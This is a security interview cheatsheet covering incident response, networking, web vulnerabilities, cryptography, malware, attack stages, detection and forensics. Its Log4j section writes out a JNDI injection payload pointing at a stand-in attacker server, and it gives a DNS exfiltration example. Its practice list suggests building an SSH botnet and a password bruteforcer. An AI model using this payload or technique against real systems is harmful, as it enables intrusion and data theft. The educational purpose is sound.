---
description: A quick reference of relevant security topics for technical interviews
---

# Security Interview Cheatsheet

## Incident Response

### Tools

* [https://github.com/meirwah/awesome-incident-response](https://github.com/meirwah/awesome-incident-response)

### Framework

<figure><img src="https://www.cynet.com/wp-content/uploads/2019/08/nist-incident-response-process-1.png" alt=""><figcaption><p>SANS</p></figcaption></figure>

* **Preparation**: Refers to the organizational preparation that is needed to be able to respond, including tools, processes, competencies, and readiness.
* **Detection & analysis**: Refers to the activity to detect a security incident in a production environment and to analyze all events to confirm the authenticity of the security incident.
* **Containment, eradication, recovery**: Refers to the required and appropriate actions taken to contain the security incident based on the analysis done in the previous phase. More analysis may also be necessary in this phase to fully recovery from the security incident.
* **Post-incident activity**: Refers to the post-mortem analysis performed after the recovery of a security incident. The operational actions performed during the process are reviewed to determine if any changes need to be made in the preparation or detection and analysis phases.

### Major Incidents

* Log4j
  * Exploit steps:
    1. Data from the User gets sent to the server (via any protocol).
    2. logs the data containing the malicious payload from the request `${jndi:ldap://some-attacker.com/a}`, where `some-attacker.com` is an attacker controlled server.
    3. The log4j vulnerability is triggered by this payload and the server makes a request to `some-attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI).
    4. This response contains a path to a remote Java class file (ex. `http://second-stage.some-attacker.com/Exploit.class`), which is injected into the server process.
    5. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
  * Detection:
    * Web server logs - [link](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml)
* SolarWinds (Sunburst)
  * Timeline - [link ](https://krebsonsecurity.com/2021/01/solarwinds-what-hit-us-could-hit-others/)
* Lapsas$
  * Attacks - [link](https://en.wikipedia.org/wiki/Lapsus$)
* Colonial Pipeline
  * Timeline - [link](https://www.nguard.com/colonial-pipeline-timeline-of-events/)

### Threat Hunting

* What is threat hunting - [link](https://www.trellix.com/en-us/security-awareness/operations/what-is-cyber-threat-hunting.html)

## Logs

### Log sources

* Firewall
* Proxy
* EDR
* DNS
* IDPS
* Threat Intel
* Cloud

## Networking

### OSI Model

<figure><img src="https://www.cloudflare.com/img/learning/ddos/what-is-a-ddos-attack/osi-model-7-layers.svg" alt=""><figcaption></figcaption></figure>

### Firewalls

* Rules to prevent incoming and outgoing connections.

### NAT

* Useful to understand IPv4 vs IPv6.

### Ports & Protocols

<figure><img src="https://ipwithease.com/wp-content/uploads/2020/06/COMMON-TCP-IP-WELL-KNOWN-PORT-NUMBERS-TABLE.jpg" alt=""><figcaption></figcaption></figure>

* DNS (53)

<figure><img src="https://www.cloudflare.com/img/learning/ddos/glossary/domain-name-system-dns/ddos-dns-request.png" alt=""><figcaption></figcaption></figure>

* Requests to DNS are usually UDP, unless the server gives a redirect notice asking for a TCP connection. Look up in cache happens first. DNS exfiltration. Using raw IP addresses means no DNS logs, but there are HTTP logs. DNS sinkholes.
* In a reverse DNS lookup, PTR might contain- 2.152.80.208.in-addr.arpa, which will map to 208.80.152.2. DNS lookups start at the end of the string and work backwards, which is why the IP address is backwards in PTR.
* DNS exfiltration
  * Sending data as subdomains.
  * 26856485f6476a567567c6576e678.badguy.com
  * Doesn’t show up in http logs.
* DNS configs
  * Start of Authority (SOA).
  * IP addresses (A and AAAA).
  * SMTP mail exchangers (MX).
  * Name servers (NS).
  * Pointers for reverse DNS lookups (PTR).
  * Domain name aliases (CNAME).
* ARP
  * Pair MAC address with IP Address for IP connections.
* DHCP
  * UDP (67 - Server, 68 - Client)
  * Dynamic address allocation (allocated by router).
  * `DHCPDISCOVER` -> `DHCPOFFER` -> `DHCPREQUEST` -> `DHCPACK`
* Multiplex
  * Timeshare, statistical share, just useful to know it exists.
* Traceroute
  * Usually uses UDP, but might also use ICMP Echo Request or TCP SYN. TTL, or hop-limit.
  * Initial hop-limit is 128 for windows and 64 for \*nix. Destination returns ICMP Echo Reply.
* Nmap
  * Network scanning tool.
* Intercepts (PitM - Person in the middle)
  * Understand PKI (public key infrastructure in relation to this).
* VPN
  * Hide traffic from ISP but expose traffic to VPN provider.
* Tor
  * Traffic is obvious on a network.
  * How do organised crime investigators find people on tor networks.
* Proxy
  * Why 7 proxies won’t help you.
* BGP
  * Border Gateway Protocol.
  * Holds the internet together.
* Network traffic tools
  * Wireshark
  * Tcpdump
  * Burp suite
* HTTP/S
  * (80, 443)
* SSL/TLS
  * (443)
  * Super important to learn this, includes learning about handshakes, encryption, signing, certificate authorities, trust systems. A good [primer](https://english.ncsc.nl/publications/publications/2021/january/19/it-security-guidelines-for-transport-layer-security-2.1) on all these concepts and algorithms is made available by the Dutch cybersecurity center.
  * POODLE, BEAST, CRIME, BREACH, HEARTBLEED.
* TCP/UDP
  * Web traffic, chat, voip, traceroute.
  * TCP will throttle back if packets are lost but UDP doesn't.
  * Streaming can slow network TCP connections sharing the same network.
* ICMP
  * Ping and traceroute.
* Mail
  * SMTP (25, 587, 465)
  * IMAP (143, 993)
  * POP3 (110, 995)
* SSH
  * (22)
  * Handshake uses asymmetric encryption to exchange symmetric key.
* Telnet
  * (23, 992)
  * Allows remote communication with hosts.
* ARP
  * Who is 0.0.0.0? Tell 0.0.0.1.
  * Linking IP address to MAC, Looks at cache first.
* DHCP
  * (67, 68) (546, 547)
  * Dynamic (leases IP address, not persistent).
  * Automatic (leases IP address and remembers MAC and IP pairing in a table).
  * Manual (static IP set by administrator).
* IRC
  * Understand use by hackers (botnets).
* FTP/SFTP
  * (21, 22)
* RPC
  * Predefined set of tasks that remote clients can execute.
  * Used inside orgs.
* Service ports
  * 0 - 1023: Reserved for common services - sudo required.
  * 1024 - 49151: Registered ports used for IANA-registered services.
  * 49152 - 65535: Dynamic ports that can be used for anything.

### HTTP&#x20;

* HTTP Request Header

<figure><img src="https://www.cloudflare.com/img/learning/ddos/glossary/hypertext-transfer-protocol-http/http-request-headers.png" alt=""><figcaption></figcaption></figure>

* \| Verb | Path | HTTP version |
* Domain
* Accept
* Accept-language
* Accept-charset
* Accept-encoding(compression type)
* Connection- close or keep-alive
* Referrer
* Return address
* Expected Size?
* HTTP Response Header
  * HTTP version
  * Status Codes:
    * 1xx: Informational Response
    * 2xx: Successful
    * 3xx: Redirection
    * 4xx: Client Error
    * 5xx: Server Error
  * Type of data in response
  * Type of encoding
  * Language
  * Charset
* UDP Header
  * Source port
  * Destination port
  * Length
  * Checksum
* Broadcast domains and collision domains.
* Root stores
* CAM table overflow

## Web Application

### OWASP Top 10

1. [**A01:2021-Broken Access Control**](https://owasp.org/Top10/A01\_2021-Broken\_Access\_Control/) moves up from the fifth position; 94% of applications were tested for some form of broken access control. The 34 Common Weakness Enumerations (CWEs) mapped to Broken Access Control had more occurrences in applications than any other category.
2. [**A02:2021-Cryptographic Failures**](https://owasp.org/Top10/A02\_2021-Cryptographic\_Failures/) shifts up one position to #2, previously known as Sensitive Data Exposure, which was broad symptom rather than a root cause. The renewed focus here is on failures related to cryptography which often leads to sensitive data exposure or system compromise.
3. [**A03:2021-Injection**](https://owasp.org/Top10/A03\_2021-Injection/) slides down to the third position. 94% of the applications were tested for some form of injection, and the 33 CWEs mapped into this category have the second most occurrences in applications. Cross-site Scripting is now part of this category in this edition.
4. [**A04:2021-Insecure Design**](https://owasp.org/Top10/A04\_2021-Insecure\_Design/) is a new category for 2021, with a focus on risks related to design flaws. If we genuinely want to “move left” as an industry, it calls for more use of threat modeling, secure design patterns and principles, and reference architectures.
5. [**A05:2021-Security Misconfiguration**](https://owasp.org/Top10/A05\_2021-Security\_Misconfiguration/) moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration. With more shifts into highly configurable software, it’s not surprising to see this category move up. The former category for XML External Entities (XXE) is now part of this category.
6. [**A06:2021-Vulnerable and Outdated Components**](https://owasp.org/Top10/A06\_2021-Vulnerable\_and\_Outdated\_Components/) was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 community survey, but also had enough data to make the Top 10 via data analysis. This category moves up from #9 in 2017 and is a known issue that we struggle to test and assess risk. It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores.
7. [**A07:2021-Identification and Authentication Failures**](https://owasp.org/Top10/A07\_2021-Identification\_and\_Authentication\_Failures/) was previously Broken Authentication and is sliding down from the second position, and now includes CWEs that are more related to identification failures. This category is still an integral part of the Top 10, but the increased availability of standardized frameworks seems to be helping.
8. [**A08:2021-Software and Data Integrity Failures**](https://owasp.org/Top10/A08\_2021-Software\_and\_Data\_Integrity\_Failures/) is a new category for 2021, focusing on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data mapped to the 10 CWEs in this category. Insecure Deserialization from 2017 is now a part of this larger category.
9. [**A09:2021-Security Logging and Monitoring Failures**](https://owasp.org/Top10/A09\_2021-Security\_Logging\_and\_Monitoring\_Failures/) was previously Insufficient Logging & Monitoring and is added from the industry survey (#3), moving up from #10 previously. This category is expanded to include more types of failures, is challenging to test for, and isn’t well represented in the CVE/CVSS data. However, failures in this category can directly impact visibility, incident alerting, and forensics.
10. [**A10:2021-Server-Side Request Forgery**](https://owasp.org/Top10/A10\_2021-Server-Side\_Request\_Forgery\_\(SSRF\)/) is added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above average testing coverage, along with above-average ratings for Exploit and Impact potential. This category represents the scenario where the security community members are telling us this is important, even though it’s not illustrated in the data at this time.

## Infrastructure (Prod / Cloud) Virtualisation

* Hypervisors.
* Hyperjacking.
* Containers, VMs, clusters.
* Escaping techniques.
  * Network connections from VMs / containers.
* Lateral movement and privilege escalation techniques.
  * Cloud Service Accounts can be used for lateral movement and privilege escalation in Cloud environments.
  * GCPloit tool for Google Cloud Projects.
* Site isolation.
* Side-channel attacks.
  * Spectre, Meltdown.
* Beyondcorp
  * Trusting the host but not the network.
* Log4j vuln.

## OS&#x20;

### Linux

#### File Structure

<figure><img src="http://www.blackmoreops.com/wp-content/uploads/2015/02/Linux-file-system-hierarchy-Linux-file-structure-optimized.jpg" alt=""><figcaption></figcaption></figure>

#### Shell Cheatsheet

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

#### Key points

* Linux persistence mechanism - [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md)
*

### Windows

#### Shell Cheatsheet

<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Key Points

* Logging cheatsheet - [link](https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5c586681f4e1fced3ce1308b/1549297281905/Windows+Logging+Cheat+Sheet\_ver\_Feb\_2019.pdf)
* Mimikatz - [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)

## Mitigations

* Patching
* Data Execution Prevention
* Address space layout randomisation
  * To make it harder for buffer overruns to execute privileged instructions at known addresses in memory.
* Principle of least privilege
  * Eg running Internet Explorer with the Administrator SID disabled in the process token. Reduces the ability of buffer overrun exploits to run as elevated user.
* Code signing
  * Requiring kernel mode code to be digitally signed.
* Compiler security features
  * Use of compilers that trap buffer overruns.
* Encryption
  * Of software and/or firmware components.
* Mandatory Access Controls
  * (MACs)
  * Access Control Lists (ACLs)
  * Operating systems with Mandatory Access Controls - eg. SELinux.
* "Insecure by exception"
  * When to allow people to do certain things for their job, and how to improve everything else. Don't try to "fix" security, just improve it by 99%.
* Do not blame the user
  * Security is about protecting people, we should build technology that people can trust, not constantly blame users.

## Cryptography, Authentication, Identity

* Encryption vs Encoding vs Hashing vs Obfuscation vs Signing
  * Be able to explain the differences between these things.
  * [Various attack models](https://en.wikipedia.org/wiki/Attack\_model) (e.g. chosen-plaintext attack).
* Encryption standards + implementations
  * [RSA](https://en.wikipedia.org/wiki/RSA\_\(cryptosystem\)) (asymmetrical).
  * [AES](https://en.wikipedia.org/wiki/Advanced\_Encryption\_Standard) (symmetrical).
  * [ECC](https://en.wikipedia.org/wiki/EdDSA) (namely ed25519) (asymmetric).
  * [Chacha/Salsa](https://en.wikipedia.org/wiki/Salsa20#ChaCha\_variant) (symmetric).
* Asymmetric vs symmetric
  * Asymmetric is slow, but good for establishing a trusted connection.
  * Symmetric has a shared key and is faster. Protocols often use asymmetric to transfer symmetric key.
  * Perfect forward secrecy - eg Signal uses this.
* Cyphers
  * Block vs stream [ciphers](https://en.wikipedia.org/wiki/Cipher).
  * [Block cipher modes of operation](https://en.wikipedia.org/wiki/Block\_cipher\_mode\_of\_operation).
  * [AES-GCM](https://en.wikipedia.org/wiki/Galois/Counter\_Mode).
* Integrity and authenticity primitives
  * [Hashing functions](https://en.wikipedia.org/wiki/Cryptographic\_hash\_function) e.g. MD5, Sha-1, BLAKE. Used for identifiers, very useful for fingerprinting malware samples.
  * [Message Authentication Codes (MACs)](https://en.wikipedia.org/wiki/Message\_authentication\_code).
  * [Keyed-hash MAC (HMAC)](https://en.wikipedia.org/wiki/HMAC).
* Entropy
  * PRNG (pseudo random number generators).
  * Entropy buffer draining.
  * Methods of filling entropy buffer.
* Authentication
  * Certificates
    * What info do certs contain, how are they signed?
    * Look at DigiNotar.
  * Trusted Platform Module
    * (TPM)
    * Trusted storage for certs and auth data locally on device/host.
  * O-auth
    * Bearer tokens, this can be stolen and used, just like cookies.
  * Auth Cookies
    * Client side.
  * Sessions
    * Server side.
  * Auth systems
    * SAMLv2o.
    * OpenID.
    * Kerberos.
      * Gold & silver tickets.
      * Mimikatz.
      * Pass-the-hash.
  * Biometrics
    * Can't rotate unlike passwords.
  * Password management
    * Rotating passwords (and why this is bad).
    * Different password lockers.
  * U2F / FIDO
    * Eg. Yubikeys.
    * Helps prevent successful phishing of credentials.
  * Compare and contrast multi-factor auth methods.
* Identity
  * Access Control Lists (ACLs)
    * Control which authenicated users can access which resources.
  * Service accounts vs User accounts
    * Robot accounts or Service accounts are used for automation.
    * Service accounts should have heavily restricted priviledges.
    * Understanding how Service accounts are used by attackers is important for understanding Cloud security.
  * impersonation
    * Exported account keys.
    * ActAs, JWT (JSON Web Token) in Cloud.
  * Federated identity

## Malware & Reversing

* Interesting malware
  * Conficker.
  * Morris worm.
  * Zeus malware.
  * Stuxnet.
  * Wannacry.
  * CookieMiner.
  * Sunburst.
* Malware features
  * Various methods of getting remote code execution.
  * Domain-flux.
  * Fast-Flux.
  * Covert C2 channels.
  * Evasion techniques (e.g. anti-sandbox).
  * Process hollowing.
  * Mutexes.
  * Multi-vector and polymorphic attacks.
  * RAT (remote access trojan) features.
* Decompiling/ reversing
  * Obfuscation of code, unique strings (you can use for identifying code).
  * IdaPro, Ghidra.
* Static / dynamic analysis
  * Describe the differences.
  * Virus total.
  * Reverse.it.
  * Hybrid Analysis.

## Exploits

* Payload examples - [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
* Three ways to attack - Social, Physical, Network
  * **Social**
    * Ask the person for access, phishing.
    * Cognitive biases - look at how these are exploited.
    * Spear phishing.
    * Water holing.
    * Baiting (dropping CDs or USB drivers and hoping people use them).
    * Tailgating.
  * **Physical**
    * Get hard drive access, will it be encrypted?
    * Boot from linux.
    * Brute force password.
    * Keyloggers.
    * Frequency jamming (bluetooth/wifi).
    * Covert listening devices.
    * Hidden cameras.
    * Disk encryption.
    * Trusted Platform Module.
    * Spying via unintentional radio or electrical signals, sounds, and vibrations (TEMPEST - NSA).
  * **Network**
    * Nmap.
    * Find CVEs for any services running.
    * Interception attacks.
    * Getting unsecured info over the network.
* Exploit Kits and drive-by download attacks
* Remote Control
  * Remote code execution (RCE) and privilege.
  * Bind shell (opens port and waits for attacker).
  * Reverse shell (connects to port on attackers C2 server).
* Spoofing
  * Email spoofing.
  * IP address spoofing.
  * MAC spoofing.
  * Biometric spoofing.
  * ARP spoofing.
* Tools
  * Metasploit.
  * ExploitDB.
  * Shodan - Google but for devices/servers connected to the internet.
  * Google the version number of anything to look for exploits.
  * Hak5 tools.

## Attack Structure

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

* Reconnaissance
  * OSINT, Google dorking, Shodan.
* Resource development
  * Get infrastructure (via compromise or otherwise).
  * Build malware.
  * Compromise accounts.
* Initial access
  * Phishing.
  * Hardware placements.
  * Supply chain compromise.
  * Exploit public-facing apps.
* Execution
  * Shells & interpreters (powershell, python, javascript, etc.).
  * Scheduled tasks, Windows Management Instrumentation (WMI).
* Persistence
  * Additional accounts/creds.
  * Start-up/log-on/boot scripts, modify launch agents, DLL side-loading, Webshells.
  * Scheduled tasks.
* Privilege escalation
  * Sudo, token/key theft, IAM/group policy modification.
  * Many persistence exploits are PrivEsc methods too.
* Defense evasion
  * Disable detection software & logging.
  * Revert VM/Cloud instances.
  * Process hollowing/injection, bootkits.
* Credential access
  * Brute force, access password managers, keylogging.
  * etc/passwd & etc/shadow.
  * Windows DCSync, Kerberos Gold & Silver tickets.
  * Clear-text creds in files/pastebin, etc.
* Discovery
  * Network scanning.
  * Find accounts by listing policies.
  * Find remote systems, software and system info, VM/sandbox.
* Lateral movement
  * SSH/RDP/SMB.
  * Compromise shared content, internal spear phishing.
  * Pass the hash/ticket, tokens, cookies.
* Collection
  * Database dumps.
  * Audio/video/screen capture, keylogging.
  * Internal documentation, network shared drives, internal traffic interception.
* Exfiltration
  * Removable media/USB, Bluetooth exfil.
  * C2 channels, DNS exfil, web services like code repos & Cloud backup storage.
  * Scheduled transfers.
* Command and control
  * Web service (dead drop resolvers, one-way/bi-directional traffic), encrypted channels.
  * Removable media.
  * Steganography, encoded commands.
* Impact
  * Deleted accounts or data, encrypt data (like ransomware).
  * Defacement.
  * Denial of service, shutdown/reboot systems.

## Threat Modeling

* Threat Matrix
* Trust Boundries
* Security Controls
* STRIDE framework
  * **S**poofing
  * **T**ampering
  * **R**epudiation
  * **I**nformation disclosure
  * **D**enial of service
  * **E**levation of privilege
* [MITRE Att\&ck](https://attack.mitre.org/) framework
* [Excellent talk](https://www.youtube.com/watch?v=vbwb6zqjZ7o) on "Defense Against the Dark Arts" by Lilly Ryan (contains _many_ Harry Potter spoilers)

## Detection

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Rules

* [https://github.com/SigmaHQ/sigma/tree/master/rules](https://github.com/SigmaHQ/sigma/tree/master/rules)
* IDS
  * Intrusion Detection System (signature based (eg. snort) or behaviour based).
  * Snort/Suricata/YARA rule writing
  * Host-based Intrusion Detection System (eg. OSSEC)
* SIEM
  * Security Information and Event Management.
* IOC
  * Indicator of compromise (often shared amongst orgs/groups).
  * Specific details (e.g. IP addresses, hashes, domains)
* Things that create signals
  * Honeypots, snort.
* Things that triage signals
  * SIEM, eg splunk.
* Things that will alert a human
  * Automatic triage of collated logs, machine learning.
  * Notifications and analyst fatigue.
  * Systems that make it easy to decide if alert is actual hacks or not.
* Signatures
  * Host-based signatures
    * Eg changes to the registry, files created or modified.
    * Strings in found in malware samples appearing in binaries installed on hosts (/Antivirus).
  * Network signatures
    * Eg checking DNS records for attempts to contact C2 (command and control) servers.
* Anomaly / Behaviour based detection
  * IDS learns model of “normal” behaviour, then can detect things that deviate too far from normal - eg unusual urls being accessed, user specific- login times / usual work hours, normal files accessed.
  * Can also look for things that a hacker might specifically do (eg, HISTFILE commands, accessing /proc).
  * If someone is inside the network- If action could be suspicious, increase log verbosity for that user.
* Firewall rules
  * Brute force (trying to log in with a lot of failures).
  * Detecting port scanning (could look for TCP SYN packets with no following SYN ACK/ half connections).
  * Antivirus software notifications.
  * Large amounts of upload traffic.
* Honey pots
  * Canary tokens.
  * Dummy internal service / web server, can check traffic, see what attacker tries.
* Things to know about attackers
  * Slow attacks are harder to detect.
  * Attacker can spoof packets that look like other types of attacks, deliberately create a lot of noise.
  * Attacker can spoof IP address sending packets, but can check TTL of packets and TTL of reverse lookup to find spoofed addresses.
  * Correlating IPs with physical location (is difficult and inaccurate often).
* Logs to look at
  * DNS queries to suspicious domains.
  * HTTP headers could contain wonky information.
  * Metadata of files (eg. author of file) (more forensics?).
  * Traffic volume.
  * Traffic patterns.
  * Execution logs.
* Detection related tools
  * Splunk.
  * Arcsight.
  * Qradar.
  * Darktrace.
  * Tcpdump.
  * Wireshark.
  * Zeek.
* A curated list of [awesome threat detection](https://github.com/0x4D31/awesome-threat-detection) resources

## Digital Forensics

* Evidence volatility (network vs memory vs disk)
* Network forensics
  * DNS logs / passive DNS
  * Netflow
  * Sampling rate
* Disk forensics
  * Disk imaging
  * Filesystems (NTFS / ext2/3/4 / AFPS)
  * Logs (Windows event logs, Unix system logs, application logs)
  * Data recovery (carving)
  * Tools
  * plaso / log2timeline
  * FTK imager
  * encase
* Memory forensics
  * Memory acquisition (footprint, smear, hiberfiles)
  * Virtual vs physical memory
  * Life of an executable
  * Memory structures
  * Kernel space vs user space
  * Tools
  * Volatility
  * Google Rapid Response (GRR) / Rekall
  * WinDbg
* Mobile forensics
  * Jailbreaking devices, implications
  * Differences between mobile and computer forensics
  * Android vs. iPhone
* Anti forensics
  * How does malware try to hide?
  * Timestomping
* Chain of custody
  * Handover notes

## Incident Management

* Privacy incidents vs information security incidents
* Know when to talk to legal, users, managers, directors.
* Run a scenario from A to Z, how would you ...
* Good practices for running incidents
  * How to delegate.
  * Who does what role.
  * How is communication managed + methods of communication.
  * When to stop an attack.
  * Understand risk of alerting attacker.
  * Ways an attacker may clean up / hide their attack.
  * When / how to inform upper management (manage expectations).
  * Metrics to assign Priorities (e.g. what needs to happen until you increase the prio for a case)
  * Use playbooks if available
* Important things to know and understand
  * Type of alerts, how these are triggered.
  * Finding the root cause.
  * Understand stages of an attack (e.g. cyber-killchain)
  * Symptom vs Cause.
  * First principles vs in depth systems knowledge (why both are good).
  * Building timeline of events.
  * Understand why you should assume good intent, and how to work with people rather than against them.
  * Prevent future incidents with the same root cause
  * Response models
    * SANS' PICERL (Preparation, Identification, Containement, Eradication, Recovery, Lessons learned)
    * Google's IMAG (Incident Management At Google)

## Coding & Algorithms

* The basics
  * Conditions (if, else).
  * Loops (for loops, while loops).
  * Dictionaries.
  * Slices/lists/arrays.
  * String/array operations (split, contaings, length, regular expressions).
  * Pseudo code (concisely describing your approach to a problem).
* Data structures
  * Dictionaries / hash tables (array of linked lists, or sometimes a BST).
  * Arrays.
  * Stacks.
  * SQL/tables.
  * Bigtables.
* Sorting
  * Quicksort, merge sort.
* Searching
  * Binary vs linear.
* Big O
  * For space and time.
* Regular expressions
  * O(n), but O(n!) when matching.
  * It's useful to be familiar with basic regex syntax, too.
* Recursion
  * And why it is rarely used.
* Python
  * List comprehensions and generators \[ x for x in range() ].
  * Iterators and generators.
  * Slicing \[start:stop:step].
  * Regular expressions.
  * Types (dynamic types), data structures.
  * Pros and cons of Python vs C, Java, etc.
  * Understand common functions very well, be comfortable in the language.

## Security Themed Coding Challenges

These security engineering challenges focus on text parsing and manipulation, basic data structures, and simple logic flows. Give the challenges a go, no need to finish them to completion because all practice helps.

* Cyphers / encryption algorithms
  * Implement a cypher which converts text to emoji or something.
  * Be able to implement basic cyphers.
* Parse arbitrary logs
  * Collect logs (of any kind) and write a parser which pulls out specific details (domains, executable names, timestamps etc.)
* Web scrapers
  * Write a script to scrape information from a website.
* Port scanners
  * Write a port scanner or detect port scanning.
* Botnets
  * How would you build ssh botnet?
* Password bruteforcer
  * Generate credentials and store successful logins.
* Scrape metadata from PDFs
  * Write a mini forensics tool to collect identifying information from PDF metadata.
* Recover deleted items
  * Most software will keep deleted items for \~30 days for recovery. Find out where these are stored.
  * Write a script to pull these items from local databases.
* Malware signatures
  * A program that looks for malware signatures in binaries and code samples.
  * Look at Yara rules for examples.
